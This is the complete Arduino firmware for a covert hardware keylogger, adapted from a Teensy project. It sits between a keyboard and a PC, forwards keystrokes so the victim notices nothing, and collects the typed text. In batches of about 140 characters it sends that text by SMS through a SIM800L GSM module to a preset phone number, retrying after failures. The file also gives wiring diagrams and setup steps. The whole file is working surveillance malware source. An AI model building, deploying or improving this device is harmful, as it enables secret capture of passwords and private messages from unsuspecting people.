// Arduino Pro Micro adaptation of https://github.com/helmmen/KEYVILBOARD (originally for Teensy)

#include <SoftwareSerial.h>             // library required for serial communication using almost(!) any Digital I/O pins of Arduino
#include "Keyboard.h"                   // library that contains all the HID functionality necessary to pass-on the typed and logged keys to the PC

/*
    The wiring could be flexible because it relies on SoftwareSerial. But keep in mind that: 
    "Not all pins on the Leonardo and Micro support change interrupts, so only the following 
    can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)". (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
    
    The following lines are responsible for wiring:
*/

//SoftwareSerial USBhost(15, 14);   
     
SoftwareSerial Sim800L(8, 9);                           // communication with sim800L
#define USBhost Serial1  /* RX TX Pro Micro pins */     // communication with USB host board (receiving input from keyboard), connected to RX/TX of Arduino Pro Micro
#define SIM800L_RESET_PIN 10                            // digital Arduino pin connected to RST of Sim800L

/*
    The wiring used with the lines above is:
    [ Pro Micro 5V   ->  sim800L ]
                8    ->  SIM_TXD
                9    ->  SIM_RXD
                VCC  ->  5V
                GND  ->  GND
            2nd GND  ->  2nd GND

                        "collector" leg -----> RST
                              |   
      10 -> 1K res -> NPN transistor "base" leg (e.g. BD137)  (see this link and notice direction of NPN transistor and reference: http://exploreembedded.com/wiki/GSM_SIM800L_Sheild_with_Arduino)
                              | 
                        "emitter" leg   -----> GND

    
    [ Pro Micro 5V   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
              GND    ->    0V (GND)
                              |
                         4.7K resistor
                              |
                             RX
                             
              RX    ->    TX
              TX    ->    2K resistor -> RX
             RAW    ->    5V   

    Possible design (don't use for wiring reference, it changed since this picture):                                              
    https://cdn.discordapp.com/attachments/417291555146039297/417340199379533824/b.jpg
    https://cdn.discordapp.com/attachments/417291555146039297/417340239942778880/c.jpg
    
    Make sure to read the comments below regarding sim800L baud rate. It has essential information required to make it work.
    
    The code sends "MODE 6" to the USB host board in order to receive raw HID data, don't worry if it changes what is received from 
    the board (if you're using it for other projects) and just send "MODE 0" command to it by for example changing the "USBhost.println("MODE 6")" line below 
    and running the code once.
*/

/* USER BASIC + ESSENTIAL SETTINGS */
#define PHONE_RECEIVER_NUMBER "+44000000000" 
#define CHAR_LIMIT 140                                // number of characters before it sends sms (shouldn't be more than 150)
/* 
    The serial connection speed below (for the SIM800L) heavily impacts how fast the sms are sent. The higher value = the faster speed.
    The default baud rate of sim800L appears to be 9600. It could be changed by sending AT+IPR=<rate> command. Possible values of the sim800L 
    baud rates compatible with Arduino Pro Micro are: 1200, 2400, 4800, 9600, 19200, 38400, 57600, 115200. If you look at the original 
    version that uses Teensy it has it set to 115200, I'm not aware of the reliability of it for Teensy because I never tested it but for 
    the Arduino Pro Micro 115200 baud rate was unreliable for me and resulted in slightly "gibberish" output. 38400 worked fine (AT+IPR=38400 command).
    57600 apeared to be the highest reliable frequency compatible between these 2 boards during my test but it's also the weirdest one...
    Twice I used AT+IPR=57600 command and twice it set it to 57700... Keep that in mind if you do the same, because if I didn't notice the response which 
    said 57700 instead of 57600 I would probably assume that I have to look for some way to revert it to orginal settings through some reset, just because it 
    set the baud rate to incorrect value. (even the datasheet says that it supports 57600 but in practice it changed it to 57700...)
    Using 57700 baud rate 140 characters long sms takes around 50ms to send (0.05 of a second).
*/
#define BAUD_RATE_SIM800L 57700                     // default is 9600 so send AT+IPR=57700 to it through serial monitor
#define BAUD_RATE_USB_HOST_BOARD 115200              // default was 9600, it was changed by: "BAUD 115200" command (ended by "carriage return", see bottom-right corner of serial monitor)

/* MORE SPECIFIC SETTINGS + DEBUGGING */
#define BAUD_RATE_SERIAL_DEBUGGING 9600
#define SIM800L_RESPONSE_TIMEOUT 2000               // milliseconds 
//#define SERIAL_DEBUG                                // I'd recommend  to comment it out before deploying the device, use it for testing and observing Serial Monitor only

/*
    Arduino Pro Micro keyboard/mouse functions have a peculiar characteristic...
    If the serial monitor is not opened and nothing is reading serial then any keyboard typing
    or mouse movements are lagging hard. Therefore there's a custom Serial_print function which
    controls whether or not to send debug lines using Serial_print depending on the state
    of SERIAL_DEBUG.
*/

/* END OF SETTINGS */

#ifdef SERIAL_DEBUG                              // before compiling the code Arduino will check wether the "#define SERIAL_DEBUG" was present and depending on that the custom serial print function will actually print things or do nothing
  /* 
   The lines below make P() function have the same functionality as the original Serial.print()
   Someone could ask why create another function instead of using original one, it's created for the 
   comfort of the developer who can toggle all the debugging output by commenting out a single line.
   Otherwise it would be necessary to comment out all the Serial.print() calls which would take time and effort. 
   This way all that has to be done to toggle the output is to uncomment or comment out the "#define SERIAL_DEBUG" line.
  */
  #define Serial_begin(x) Serial.begin(x)       // now when Serial_begin will be used it will do exactly the same as the original Serial.begin
  #define P(x) Serial.print(x) 
  #define PL(x) Serial.println(x)
  #define P2(x,y) Serial.print(x,y)
  #define PL2(x,y) Serial.println(x,y)
#else                                          // else define these functions as empty, so they will do nothing if the "#define SERIAL_DEBUG" line is not present above (e.g. if it's commented out)
  #define Serial_begin(x)                      // now Serial_begin function does nothing and doesn't even have to be deleted from any other part of the code, it can just stay there because it will do nothing
  #define P(x)
  #define PL(x)
  #define P2(x,y)
  #define PL2(x,y)
#endif

char TextSms[CHAR_LIMIT+2];                   // + 2 for the last confirming byte sim800L requires to either confirm (byte 26) or discard (byte 27) new sms message
int char_count;                               // how many characters were "collected" since turning device on (or since last sms was sent)

//asciiMap copied from https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.cpp
const PROGMEM byte asciiMap[128] = {0,0,0,0,0,0,0,0,42,43,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,158,180,160,161,162,164,52,166,167,165,174,54,45,55,56,39,30,31,32,33,34,35,36,37,38,179,51,182,46,183,184,159,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,47,49,48,163,173,53,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,175,177,176,181,0};
const PROGMEM byte keyPadMap[16] = {85,87,0,86,99,84,98,89,90,91,92,93,94,95,96,97};


bool smsFailed = false;
unsigned long failedSmsTime;
char backupTextSms[CHAR_LIMIT+2];
byte backupCharCount = 0;
byte emergencySmsRoutineStep = 0;
bool smsWasSent = false;
unsigned long smsSendingTime;


void setup() {
  Serial_begin(BAUD_RATE_SERIAL_DEBUGGING);                   // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code)
  Sim800L.begin(BAUD_RATE_SIM800L);                           // begin serial communication with the sim800L module to let it know (later) to send an sms 
  Sim800L.write("AT+CMGF=1\r\n");                             // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
  USBhost.begin(BAUD_RATE_USB_HOST_BOARD);                    // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
  USBhost.println("MODE 6"); delay(500); while(USBhost.available()){USBhost.read();} // set the mode and ignore response (get rid of it from buffer)
  Keyboard.begin();                                           // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
  pinMode(SIM800L_RESET_PIN, OUTPUT);
  digitalWrite(SIM800L_RESET_PIN, LOW);
}



void loop() {
  HandlingSim800L();                                          // function responsible for sending sms (+ release all buttons if message is going to be sent)
  HandlingUSBhostBoard();                                     // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC 

  if(smsFailed){
    EmergencySmsRoutine();                                      // if sms couldn't be sent then reset/reboot Sim800L and try sending sms again, do it without interrupting HID data collection hence this "emergency routine" exists
  }

  if(smsWasSent){
    HandleDelayedSmsResponse();
  }
}



/* ------------------------------------------------------------------------------------------------------------
    USB host board stuff

   
*/

char hidText[27];
byte hbc = 0;                                                     // hidText string buffer count 
byte rawHID[8];                                                   // modifier_bit_map, manufacturer(ignore) , key1, key2, key3, key4, key5, key6
byte prevRawHID[8];
byte fullBufferFlag_preventHold;

void HandlingUSBhostBoard() {                                     // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC     
  if (USBhost.available() > 0){   
    if(USBhost.available() == 63){fullBufferFlag_preventHold = true;}                                                               //P(F("OCCUPIED BUFFER BYTES (USBhost.available): ")); PL((int)USBhost.available());                                
    hidText[hbc] = USBhost.read(); hbc++;   
    IgnoreBytesIfUseless();                                       // decreases hbc if required
    
    if(hbc == 26){                                                // if the full string (25 bytes long) representing 8 HID values is received (e.g. "\n\r02-00-04-00-00-00-00-00")
      hidText[hbc]=0;
      ConvertInputToBytes();      
      Send_Report();
      SaveTheKey();           
      CleanUpVars();

      FullBuffer_BugPrevention();
    }     
  }
  
}

void SaveTheKey(){
  if(WasKeyPressed()){
     byte key = GetKeyPressed();
     if(key){
      
      P(F("\nrawHID string: ")); PL(hidText);                                                                       // debug line
      P(F("rawHID key detected: hex - ")); P2(key, HEX); P(F(", int - ")); PL((int)key);                            // debug line
      
      byte asciiKey = HID_to_ASCII(key, WasShiftDown());
      P(F("Ascii key detected: hex - ")); P2(asciiKey, HEX); P(F(", int - ")); P((int)asciiKey); P(F(", char - ")); PL((char)asciiKey);
      
      if(asciiKey){
        TextSms[char_count] = (char)asciiKey;
        char_count++;
        if(char_count == sizeof(TextSms)){char_count=0;}
      }
      asciiKey = 0;
    }
    key = 0; 
  }
  else if (WasModifierPressed()){} else{} // was released
}

byte HID_to_ASCII(byte key, bool shiftDown){
  for(byte i=0; i<128; i++){                                                      // asciiMap contains HID values (some modified), their order indicates which ascii value should be used 
    byte b = pgm_read_byte(asciiMap + i);                                         // some HID values are modified - if the HID value from the asciiMap array is over 127 then it means that shift must be used with it 
    if(!(shiftDown == false && b >= 128) && !(shiftDown == true && b < 128))      // so if the user actually was holding shift then take into account only the values over 127 when trying to convert it to ascii
      if(key == (shiftDown ? b ^ 128 : b))                                        // if shift was not pressed then take search through values equal or lower than 127
        return i;
  }   
  for(byte i=0; i < 16; i++)                                    // numpad keys
    if(key == pgm_read_byte(keyPadMap + i)) 
      return i+42;
  return 0; 
}

void IgnoreBytesIfUseless()                             {if((hbc == 1 && hidText[hbc-1] != 10) || (hbc == 2 && hidText[hbc-1] != 13)){hbc--;}}  // 2 bytes (10 and 13) are received before the string that includes raw HID info //P(F("hbc_VALUE: ")); P(hbc); P(", Char: "); PL(hidText[hbc-1]);
void ConvertInputToBytes()                              {for(byte j=0; j<8; j++){char buff[3] = {hidText[j*2+j+2], hidText[j*2+j+3], 0}; rawHID[j] = (byte)strtoul(buff, NULL, 16); memset(buff,0,sizeof(buff));}} // convert string to 8 HID bytes                  
void Send_Report()                                      {KeyReport kr = {rawHID[0], rawHID[1], {rawHID[2], rawHID[3], rawHID[4], rawHID[5], rawHID[6], rawHID[7]}}; HID().SendReport(2, &kr, sizeof(KeyReport)); /*PL(F("Report Sent."));*/}                                                               
bool WasKeyPressed()                                    {for(int i=2; i<8; i++){if(rawHID[i] == 0){return false;} if(prevRawHID[i] == 0){return true;}} return false;}
bool WasModifierPressed()                               {return (rawHID[0] > prevRawHID[0]);}
byte GetKeyPressed()                                    {for(int i=2; i<8; i++){if(rawHID[i] > 0 && prevRawHID[i] == 0){return rawHID[i];}}return 0;}
bool WasShiftDown()                                     {return (IsBitHigh(rawHID[0], 1) || IsBitHigh(rawHID[0], 5));} // if 2nd or 6th bit (left/right shift)
bool IsBitHigh(byte byteToConvert, byte bitToReturn)    {byte mask = 1 << bitToReturn;return (byteToConvert & mask) == mask;} // thanks to Marc Gravell's https://stackoverflow.com/questions/9804866/return-a-specific-bit-as-boolean-from-a-byte-value
void ReleaseAllButtons(char* reason)                    {KeyReport kr = {0,0,{0,0,0,0,0,0}};HID().SendReport(2, &kr, sizeof(KeyReport)); /*P(F("RELEASING ALL BUTTONS. Reason: ")); PL(reason);*/}
void CleanUpVars()                                      {for(byte j=0; j<sizeof(rawHID); j++){prevRawHID[j] = rawHID[j];} memset(rawHID,0,sizeof(rawHID)); memset(hidText,0,sizeof(hidText)); hbc = 0;}
void FullBuffer_BugPrevention()                         {if(fullBufferFlag_preventHold){ReleaseAllButtons("USBhost buffer was full. Bytes could be lost. Holding bug was possible."); if(USBhost.available() < 1){fullBufferFlag_preventHold=false;}}}



/* ------------------------------------------------------------------------------------------------------------
    sim800L stuff

  
 */


void HandleDelayedSmsResponse(){
  if(millis() - smsSendingTime > 4000){   
    char response[80];
    PL("");
    if (Get_Sim800L_Response(response, sizeof(response), NULL)){
      if(strstr(response, "OK")){
        PL(F("Sms was probably sent successfully. 'OK' response was received."));
      }
      else{
        PL(F("WARNING: 'OK' not received in sms response. Response:"));
        PL(response);
      }
    }
    else{
      PL(F("WARNING: No response after sending sms."));
    }
    memset(response, 0, sizeof(response));
    
    //USBhost.listen();

    smsWasSent = false;
  }
}

void EmergencySmsRoutine(){
  switch(emergencySmsRoutineStep){
    case 0:
      ResetSim800L();
      emergencySmsRoutineStep++;  
      break;

      /*
    case 1:
      if(millis() - failedSmsTime > 5000){
        //Sim800L.write("AT");
        emergencySmsRoutineStep++;
      }
      break; 
      
    case 2:
      if(millis() - failedSmsTime > 9000){
        ReleaseAllButtons();
        char response[80];
        if (Get_Sim800L_Response(response, sizeof(response), "AT")){
          if(strstr(response, "SMS Ready")){
            PL(F("Sim800L re-booted successfully. 'SMS Ready' response received ('AT')."));
          }
          else{
            PL(F("WARNING: 'SMS Ready' not received ('AT'). Proceeding anyway..."));
            PL(F("Response was:")); PL(response);
          }
        }
        else{
          PL(F("WARNING: No response to 'AT' command. Proceeding anyway..."));
          PL(F("Response was:")); PL(response);
        }
        memset(response, 0, sizeof(response));
        emergencySmsRoutineStep++;
      }
      break;*/
      
    case 1:
      if(millis() - failedSmsTime > 5000){
        Sim800L.write("AT+CMGF=1\r\n");
        emergencySmsRoutineStep++;
      }
      break;     

    case 2:
      if(millis() - failedSmsTime > 8000){
        char response[80];
        if (Get_Sim800L_Response(response, sizeof(response), "AT+CMGF=1\r\n")){
          if(strstr(response, "OK")){
            PL(F("Sms mode set successfully. 'OK' response received ('AT+CMGF=1')."));
          }
          else{
            PL(F("WARNING: 'OK' not received after setting sms mode ('AT+CMGF=1'). Proceeding anyway..."));
            PL(F("Response was:")); PL(response);
          }
        }
        else{
          PL(F("WARNING: No response to 'AT+CMGF=1' command. Proceeding anyway..."));
          PL(F("Response was:")); PL(response);
        }
        memset(response, 0, sizeof(response));
        emergencySmsRoutineStep++;
      }
      break;
            
    case 3:
      PL(F("Trying to re-send sms..."));
      if(SendSms(PHONE_RECEIVER_NUMBER, backupTextSms, backupCharCount)){
        emergencySmsRoutineStep=0;
        smsFailed = false;
        memset(backupTextSms, 0, sizeof(backupTextSms));
        PL(F("Sms sent successfully"));
      }
      else{
        failedSmsTime = millis(); 
        emergencySmsRoutineStep=0;
        PL(F("Failed again. Re-trying procedure..."));
      }  
      break;    
  }  
}

void HandlingSim800L() { 
  if (char_count == CHAR_LIMIT - 1) {
    if(SendSms(PHONE_RECEIVER_NUMBER, TextSms, char_count)){
      // do nothing
    }
    else{
      smsFailed = true;
      failedSmsTime = millis();
      strncpy(backupTextSms, TextSms, char_count);
      PL(F("WARNING: Sending sms failed. Emergency routine activated. (Resetting, waiting 10 seconds, sending again)"));
      backupCharCount = char_count;
    }
    char_count = 0; 
  } 
}

void ResetSim800L(){
  digitalWrite(SIM800L_RESET_PIN, HIGH);
  delay(100);
  digitalWrite(SIM800L_RESET_PIN, LOW);
  PL(F("Resetted Sim800L module."));
}

bool SendSms(char* number, char* text, byte len){
  bool success;
  unsigned long functionEntryTime = millis();
  char sms_cmd[40];
  //Sim800L.listen();
  PL(F("\nSms with the following content is about to be sent to sim800L: ")); PL(TextSms);
  sprintf(sms_cmd, "AT+CMGS=\"%s\"\r\n", number);
  text[len] = 26; text[len+1] = 0;

  if (Send_Sim800L_Cmd(sms_cmd, ">")){
    Sim800L.print(text);
    smsWasSent = true;
    smsSendingTime = millis();
    PL(F("Sms should be sent now, confirmation response will be handled after 4 seconds."));
    success = true;
  }else{
    success = false;
  }
  
  //USBhost.listen();
  if(success == true){PL(F("Sending SMS took: ")); P(millis() - functionEntryTime); PL("ms.");}
  memset(sms_cmd, 0, sizeof(sms_cmd));
  return success;
}

bool Send_Sim800L_Cmd(char* cmd, char* desiredResponsePart){ 
  while(Sim800L.available()){Sim800L.read();}                               // clean the buffer before sending command (just in case if previous response was not fully read)
  Sim800L.write(cmd);
  PL(F("\nThe following command has been sent to sim800L: ")); PL(cmd);
  PL(F("Waiting for response..."));
  
  char response[60];
  if(!Get_Sim800L_Response(response, sizeof(response), cmd)){
    PL(F("WARNING: No response received within 2000ms."));
    return false;
  }
  else{
    if(!strstr(response, desiredResponsePart)){ 
      PL(F("WARNING: Response did not include desired characters."));
      PL(F("Response: ")); PL(response);
      memset(response, 0, sizeof(response));
      return false; 
    }
    else{
      PL(F("Response: ")); PL(response);
      memset(response, 0, sizeof(response));
      return true;
    }
  }
}

bool Get_Sim800L_Response(char* response, byte respLen, char* lastCmd) {                    // timeout = waitForTheFirstByteForThatLongUntilReturningFalse, keepCheckingFor = checkingTimeLimitAfterLastCharWasReceived
  for(byte i=0; i < respLen; i++){response[i]=0;}  //clear buffer
  ReleaseAllButtons("Getting Sim800L response.");
  unsigned long functionEntryTime = millis();
  while(Sim800L.available() <= 0){
    delay(1);
    if(millis() - functionEntryTime > 2000){
      return false;
    }
  }

  byte i=0;
  byte ignorePreviouslyTypedCommand = 0;                                                  // value used to ignore the command that was sent in case if it's returned back (which is done by the sim800L...)
  unsigned long lastByteRec = millis();                                                   // timing functions (needed for reliable reading of the BTserial)
  while (10 > millis() - lastByteRec)                                                     // if no further character was received during 10ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
  {         
    while (Sim800L.available() > 0 && i < respLen - 1) {
      if(i == strlen(lastCmd)){
        if(!strncmp(response, lastCmd, strlen(response)-1)){
          ignorePreviouslyTypedCommand = i+1;
          //PL("IGNORING_PREVIOUSLY_TYPED_CMD_THAT_IS_RETURNED_FROM_SIM_800L");
          for(byte j=0; j<i; j++){response[j]=0;}                                         // clear that command from response 
        }
      }
      byte ind = i - ignorePreviouslyTypedCommand;
      if(ind < 0){ind=0;} 
      response[ind] = Sim800L.read(); 
      i++;
      lastByteRec = millis();
    }    
    if(i >= respLen - 1){PL(F("WARNING: Sim800L response size is over limit.")); return true;}
  }
  return true;
}


